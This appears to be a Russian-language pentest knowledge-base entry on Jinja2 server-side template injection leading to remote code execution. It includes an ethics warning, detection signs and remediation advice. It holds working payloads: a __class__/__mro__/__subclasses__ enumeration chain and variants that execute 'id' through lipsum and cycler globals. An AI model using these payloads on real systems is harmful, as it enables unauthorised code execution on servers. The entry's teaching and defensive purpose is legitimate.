---
id: ssti-python-class-chain
title: "SSTI (Python): цепочка к subprocess через __class__"
type: ssti
target: python
category: web
difficulty: advanced
bypass: filter
tags: [ssti, python, jinja2, rce]
tested_on: ["Jinja2 3.x без sandbox"]
success_rate: 0.45
risk: high
cwe: "CWE-1336"
lab: null
last_verified: "2026-10-23"
references:
  - "https://portswigger.net/web-security/server-side-template-injection"
graph:
  - target: "ssti"
    type: instance_of
  - target: "rce"
    type: leads_to
---

# SSTI (Python): цепочка к subprocess через __class__

!!! warning "Этика"
    Только лаборатории `hackbook` или системы с письменным разрешением на тестирование.

## Payload
```
{{''.__class__.__mro__[1].__subclasses__()}}
```

## Explanation

Из строкового литерала через MRO (method resolution order) поднимаются к `object`,
а от него — к списку всех загруженных классов Python. В нём ищут класс, способный
выполнить команду (`subprocess.Popen`, `os._wrap_close`, предупреждения, файловые классы),
и вызывают его. Это стандартный путь SSTI -> RCE в Jinja2/Tornado без песочницы.
Индекс нужного класса зависит от окружения, поэтому его определяют перебором или
поиском по имени: `|selectattr(...)`/`|attr(...)`.

## Detection

Если `{{7*7}}` вычисляется — SSTI подтверждён; дальнейшая эксплуатация в лабе.
В production фиксируйте сам факт вычисления выражений как критическую уязвимость.
Признаки в логах: запросы с `__class__`, `__mro__`, `__subclasses__`, `__globals__`.

## Remediation

- `SandboxedEnvironment` в Jinja2 + запрет доступа к dunder-атрибутам.
- Не рендерить пользовательские шаблоны вообще.
- WAF-сигнатуры на `__class__`, `__mro__`, `__subclasses__`, `{{`, `${`.
- Процесс рендера без прав на ФС/сеть, с `seccomp`.

## Variants

```
{{request.__class__._load_form_data.__globals__}}
```

```
{{lipsum.__globals__['os'].popen('id').read()}}
```

```
{{cycler.__init__.__globals__.os.popen('id').read()}}
```
